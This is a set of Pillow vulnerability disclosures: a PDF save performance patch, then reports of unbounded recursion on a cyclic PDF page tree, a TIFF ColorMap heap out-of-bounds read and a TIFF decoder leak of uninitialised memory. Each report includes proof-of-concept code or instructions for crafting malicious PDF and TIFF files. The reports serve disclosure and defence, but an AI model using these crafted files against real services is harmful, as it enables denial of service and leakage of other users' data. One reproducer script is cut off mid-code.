ever stored in `XrefTable` instead of rebuilding the key set on every call. The attached patch does this in `src/PIL/PdfParser.py`: ```diff --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ class XrefTable: self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ class PdfParser: def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` `existing_entries` is only ever populated through `__setitem__` (from `read_xref_table` / `read_prev_trailer`), so the counter also covers ids read from an existing file in `append=True` mode. The one behavioural difference: when the highest-numbered existing object has just been deleted (`del_root()` / `rewrite_pages()` in append mode), the current code hands that id out again with generation 0, whereas the patch moves on to the next unused id — the more conservative choice for an xref table, and the one the existing `TODO: support reuse of deleted objects` comment points at. With the patch applied and Pillow rebuilt, the 16 000-frame save drops from ~70 s to ~2.5 s, fresh PDF output is unchanged, `Tests/test_file_pdf.py` and `Tests/test_pdfparser.py` pass, and the reproducer prints `OK`. An alternative limited to the writer would be to reserve the `3 × number_of_pages` ids in `PdfImagePlugin._save()` arithmetically from a single `next_object_id()` call, but fixing the allocator also covers `write_obj(None, …)` callers. The patch does not address a separate, linear issue: `PdfImagePlugin._save()` still trusts `n_frames` before any frame is decoded, so a tiny file whose format reports a declared-only frame count (APNG `acTL` up to 2³¹) still makes it loop `3 × n_frames` times before the first failing seek. Reserving ids per successfully seeked frame, or validating `n_frames` in such plugins, would close that. ## The patch Track the highest object ID in XrefTable so PdfParser.next_object_id() is O(1) instead of rebuilding and scanning the key set Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..82ebfb867 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -133,12 +133,15 @@ class XrefTable: ) # object ID => (offset, generation) self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ -624,11 +627,8 @@ class PdfParser: self.orig_pages = self.pages[:] def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` ## The reproducer
Reproducer — repro, 1,791 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # PDF save_all is O(frames^2): PdfParser.next_object_id() does max(XrefTable.keys()), # and keys() rebuilds sets of every id reserved so far, 3 calls per frame. # (a) valid 1x1 animated GIF, 15 bytes/frame; (b) 125-byte APNG whose acTL merely # *declares* N frames - ids are reserved for all N before the first seek fails. import io, struct, time, zlib from PIL import Image def gif(n): return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff" + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00" * n + b"\x3b") def apng(n): def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d)) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)) + chunk(b"acTL", struct.pack(">II", n, 0)) + chunk(b"fcTL", struct.pack(">IIIIIHHBB", 0, 1, 1, 0, 0, 1, 1, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00")) + chunk(b"IEND", b"")) def save_pdf(data): im = Image.open(io.BytesIO(data)) t = time.process_time() try: im.save(io.BytesIO(), "PDF", save_all=True) res = "ok" except OSError as e: # APNG: frames don't exist, fails *after* the id loop res = f"OSError({e})" return time.process_time() - t, res bug = False for name, make in (("GIF", gif), ("APNG", apng)): t = {} for n in (2000, 8000): data = make(n) t[n], res = save_pdf(data) print(f"{name:4} frames={n:5} file={len(data):6} B save CPU={t[n]:6.2f}s result={res}") growth = t[8000] / t[2000] print(f"{name}: 4x frames -> {growth:.1f}x CPU (linear ~4x, quadratic ~16x)") if growth >= 8: bug = True print("BUG" if bug else "OK") ```

summary: Pillow: Unbounded recursion parsing a PDF page tree or trailer chain (incomplete fix for CVE-2026-42310)
details:
### Summary
When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.

### Details
`linearize_page_tree` recurses on `/Kids` with no cycle or depth check:

- `src/PIL/PdfParser.py:1078-1092`

`read_prev_trailer` catches only a repeated offset:

- `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)

### PoC
```python
from PIL import PdfParser

# A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2).
objs = {
    1: b"<< /Type /Catalog /Pages 2 0 R >>",
    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>",
}
buf = bytearray(b"%PDF-1.4\n")
off = {}
for oid in (1, 2, 3):
    off[oid] = len(buf)
    buf += b"%d 0 obj\n" % oid + objs[oid] + b"\nendobj\n"
xref = len(buf)
buf += b"xref\n0 4\n0000000000 65535 f \n"
buf += b"".join(b"%010d 00000 n \n" % off[o] for o in (1, 2, 3))
buf += b"trailer\n<< /Root 1 0 R /Size 4 >>\nstartxref\n%d\n%%%%EOF\n" % xref
open("poc.pdf", "wb").write(buf)

PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way
```

Run it:
```
$ python 11_poc.py
RecursionError: maximum recursion depth exceeded
```

The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.

### Impact
A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

summary: Pillow: TIFF encoder ColorMap plane-size mismatch causes a heap out-of-bounds read
details:
## Summary

A small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.

Pillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.

The malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.

## Impact and prerequisites

An application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.

The 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.

## Tested environment and limits of the evidence

The existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:

- Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`
- Wheel size: `4785266` bytes
- Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`
- Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`
- Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`

Apple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.

Only this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.

Separate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.

## Observed evidence and controls

The earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format="TIFF")`, without replacing the image's metadata. Each case was recorded three times:

| Original fixture | Bytes | Recorded result |
| --- | ---: | --- |
| `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |
| `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |
| `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |

Address-free summary of the recorded native diagnostic:

```text
AddressSanitizer: heap-buffer-overflow
READ of size 131072
0 bytes after 1536-byte region
Copy path: memcpy -> _TIFFmemcpy -> setByteArray -> _TIFFsetShortArrayExt
           -> _TIFFVSetField -> TIFFVSetField -> ImagingLibTiffSetField
           -> PyImaging_LibTiffEncoderNew
Allocation: calloc -> PyImaging_LibTiffEncoderNew
```

Input SHA-256 values (also enforced inside the script):

- `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`
- `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`
- `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`

## Root cause and source references

- [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.
- [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.
- [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L << td->td_bitspersample` and copies that many SHORTs from each pointer.

The reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.

## Prior art and disclosure scope

[Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `"CustomField"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.

## Reproduction instructions

Use an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.

Save the complete Python block below as `reproduce.py` and run:

```sh
python3.11 -I -S -B reproduce.py \
  --package-path /absolute/path/to/reviewed/site-packages \
  --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib
```

Both arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.

Each of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.

The compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.

**Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.

## Expected results from the standalone script

Cases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.

The parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.

## Complete standalone reproducer

```python
import argparse
import base64
import ctypes
import hashlib
import io
import json
import os
from pathlib import Path
import platform
import resource
import selectors
import struct
import subprocess
import sys
import tempfile
import time
import zlib


FIXTURES = {'colormap8': [1684,
               'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',
               'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],
 'colormap_absent': [137,
                     'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',
                     'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],
 'colormap16': [1685,
                '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',
                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}
PACKAGE_PINS = {'PIL/ImageFile.py': '983c4f35e0c51046d4c636998ec77000cd2da208870a03b205e104cd0b2df629',
 'PIL/_version.py': 'fe7d75d4019326aca24ae57d4ab190cd62ba1225b175051119cd61cd87e42b1d',
 'PIL/__init__.py': '7361b6ad3878589affe5956e4a4da24d71398b0891fd3a8c15e9362217b4ca01',
 'PIL/features.py': '14f904863b416914aaa6480735876ec31885b7272ee0d8d92b010c5b1b5e98f5',
 'PIL/TiffTags.py': '766dea350424b9a2caab3513be794689403c2b7222cd038006f69cff08edb45d',
 'PIL/TiffImagePlugin.py': '440b2a3a80b280d18cda3fc70d9fd206e2fa44e9897c9550f70b51395047b273',
 'PIL/_imaging.cpython-311-darwin.so': '6d09b1fb925779fff32b5b8a4c348a42c201d350d0e0fd8cdc00410b6779e596',
 'PIL/Image.py': '04af3f2db7ffdd61e829fa7aa8f5481d394a0a4129a8fd8aa5b13908928fcd6d',
 'PIL/.dylibs/libtiff.6.dylib': 'e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1',
 'pillow-12.3.0.dist-info/WHEEL': 'de2586b77651a8bf1b7778c3609979713ebc901784a837fca80ed4969fc82e57',
 'pillow-12.3.0.dist-info/METADATA': '8fc07146cab33ef7582361dab6eac596d340b03ec648f18217da7894f73838c8'}
CASES = tuple(FIXTURES)
WALL_SECONDS = 30
FILE_LIMIT = 1024 * 1024
PIPE_LIMIT = 128 * 1024


def limits():
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    resource.setrlimit(resource.RLIMIT_CPU, (10, 10))
    resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT, FILE_LIMIT))


def fixture(case):
    size, expected_hash, encoded = FIXTURES[case]
    decoder = zlib.decompressobj()
    data = decoder.decompress(base64.b64decode(encoded, validate=True), size + 1)
    if (len(data) != size or not decoder.eof or decoder.unused_data
            or decoder.unconsumed_tail
            or hashlib.sha256(data).hexdigest() != expected_hash):
        raise ValueError("fixture integrity check failed")
    return data


def field(data, wanted):
    if len(data) < 8 or data[:4] not in (b"II*\0", b"MM\0*"):
        raise ValueError("not classic TIFF")
    endian = "<" if data[:2] == b"II" else ">"
    directory = struct.unpack_from(endian + "I", data, 4)[0]
    count = struct.unpack_from(endian + "H", data, directory)[0]
    if directory + 2 + count * 12 + 4 > len(data):
        raise ValueError("truncated directory")
    for number in range(count):
        offset = directory + 2 + number * 12
        tag, kind, length = struct.unpack_from(endian + "HHI", data, offset)
        if tag != wanted:
            continue
        size = {1: 1, 2: 1, 3: 2, 4: 4, 7: 1}[kind] * length
        start = offset + 8 if size <= 4 else struct.unpack_from(endian + "I", data, offset + 8)[0]
        if start + size > len(data):
            raise ValueError("truncated field")
        return kind, length, data[start:start + size], endian
    return None


def checked_image_module(package):
    if (sys.implementation.name != "cpython" or sys.version_info[:2] != (3, 11)
            or sys.platform != "darwin" or platform.machine() != "arm64"):
        raise RuntimeError("requires macOS ARM64 CPython 3.11")
    for relative, expected in PACKAGE_PINS.items():
        path = (package / relative).resolve(strict=True)
        if not path.is_relative_to(package) or hashlib.sha256(path.read_bytes()).hexdigest() != expected:
            raise RuntimeError("reviewed wheel file mismatch")
    process_symbols = ctypes.CDLL(None)
    for symbol in ("__asan_init", "__asan_address_is_poisoned", "__asan_region_is_poisoned"):
        getattr(process_symbols, symbol)
    sys.path.insert(0, str(package))
    from PIL import Image, features
    if (Image.__version__ != "12.3.0" or features.version("libtiff") != "4.7.1"
            or Path(Image.__file__).resolve() != package / "PIL/Image.py"
            or Path(Image.core.__file__).resolve() != package / "PIL/_imaging.cpython-311-darwin.so"):
        raise RuntimeError("unexpected Pillow or libtiff")
    return Image


def emit(descriptor, message):
    os.write(descriptor, (json.dumps(message, sort_keys=True) + "\n").encode("ascii"))


def child(case, package):
    descriptor = os.dup(1)
    with open(os.devnull, "wb") as quiet:
        os.dup2(quiet.fileno(), 1)
    try:
        image_module = checked_image_module(package)
        data = fixture(case)
        with image_module.open(io.BytesIO(data)) as image:
            image.load()
            if image.size != (1, 1) or image.info.get("compression") != "packbits":
                raise ValueError("unexpected input geometry")
            bits = 8 if case == "colormap8" else 16
            if image.tag_v2[258] != (bits,):
                raise ValueError("unexpected sample width")
            if case == "colormap_absent":
                if 320 in image.tag_v2:
                    raise ValueError("unexpected ColorMap")
            elif image.tag_v2[320] != (0,) * 768:
                raise ValueError("unexpected ColorMap planes")
            emit(descriptor, {"ready": True})
            with io.BytesIO() as output:
                image.save(output, format="TIFF")
                if case == "colormap16":
                    emit(descriptor, {"unsafe_save_returned": True})
                    return 1
                encoded = output.getvalue()
                saved_bits = field(encoded, 258)
                map_field = field(encoded, 320)
                bits_preserved = (saved_bits is not None and saved_bits[:2] == (3, 1)
                                  and struct.unpack(saved_bits[3] + "H", saved_bits[2])[0] == bits)
                map_preserved = (map_field is None if case == "colormap_absent"
                                 else map_field is not None and map_field[:2] == (3, 768)
                                 and map_field[2] == bytes(1536))
                emit(descriptor, {"control_passed": bool(bits_preserved and map_preserved)})
        return 0
    except Exception:
        emit(descriptor, {"child_failed": True})
        return 2
    finally:
        os.close(descriptor)


def run_case(case, package, runtime):
    with tempfile.TemporaryDirectory(prefix="pillow-check-") as temporary:
        environment = {
            "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
            "HOME": temporary,
            "TMPDIR": temporary,
            "LC_ALL": "C",
            "DYLD_INSERT_LIBRARIES": str(runtime),
            "ASAN_OPTIONS": "detect_leaks=0:halt_on_error=1:abort_on_error=0:exitcode=86:"
                            "disable_coredump=1:symbolize=1:malloc_fill_byte=165:"
                            "max_malloc_fill_size=1048576:log_path=stderr",
        }
        command = [sys.executable, "-I", "-S", "-B", str(Path(__file__).resolve()),
                   "--package-path", str(package), "--asan-runtime", str(runtime), "--child", case]
        output = bytearray()
        diagnostics = bytearray()
        deadline = time.monotonic() + WALL_SECONDS
        with subprocess.Popen(command, cwd=temporary, env=environment, stdin=subprocess.DEVNULL,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              preexec_fn=limits, start_new_session=True) as process:
            bounded = True
            try:
                with selectors.DefaultSelector() as selector:
                    selector.register(process.stdout, selectors.EVENT_READ, output)
                    selector.register(process.stderr, selectors.EVENT_READ, diagnostics)
                    while selector.get_map():
                        remaining = deadline - time.monotonic()
                        if remaining <= 0:
                            raise TimeoutError
                        for key, events in selector.select(min(remaining, 0.25)):
                            chunk = os.read(key.fileobj.fileno(), 8192)
                            if not chunk:
                                selector.unregister(key.fileobj)
                            else:
                                key.data.extend(chunk)

        try:
```

summary: Pillow: TiffDecode returns uninitialized memory as pixels for short JPEG strips
details:
``` ============================================================================ TiffDecode returns uninitialized memory as pixels for short JPEG strips Location: src/libImaging/TiffDecode.c:554 in _decodeStrip() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content. The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state->buffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early. The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b"LEAK"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases. This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c ("Add reading old-JPEG compressed TIFFs", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0). ## Details `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and then copies all `RowsPerStrip` rows of that buffer into the image whenever `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist and returns the full strip size. The rows it did not write are whatever the heap held before, and Pillow returns them as pixels. A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`, `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data is a baseline JPEG of 256×**8** pixels (as written by `Image.new("L",(256,8),200).save(…,"JPEG")`). `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the nominal strip size on success, not the number of rows produced, and the only check is `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im->image` (which itself is zeroed by `core.new`, so the garbage provably comes from `state->buffer`). `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then `tile_length` rows copied after each `TIFFReadTile()` at 460–488). For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes and the copy is correct. The malicious file differs only in the SOF height of the embedded JPEG; libtiff treats "JPEG smaller than strip" as a warning, clamps the row count to the JPEG height, and reports success. JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode` (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error, libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were checked and do return -1 on short data, so Pillow raises `OSError` for those. The strip path was introduced in `e91b851fdc1c` ("Add reading old-JPEG compressed TIFFs", 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()` (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy. The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02, Pillow 5.3.0). ## Impact Any application that opens attacker-supplied images with Pillow in the default configuration and returns something derived from the pixels (thumbnail, preview, format conversion, OCR text) discloses freed heap memory of the worker process to the uploader: everything below the rows the embedded JPEG/G4 stream actually encodes, up to `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no signal that the image is malformed. What comes back depends on allocator state; in a long-running web worker it is typically recently freed request bodies, other users' decoded image buffers and Python object contents. There is no memory corruption; this is a read of uninitialised (previously used) heap memory, analogous in effect to an out-of-bounds read that lands in pixels. ## Reproducing `repro` is a short Python script that runs against the installed Pillow build with default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it prints is `BUG` or `OK`. **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG encoder. For each layout the script builds two files: - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole 64 KiB strip/tile. - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full strip/tile size as success. **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with `b"LEAK"`, which leaves freed heap chunks about the size of the 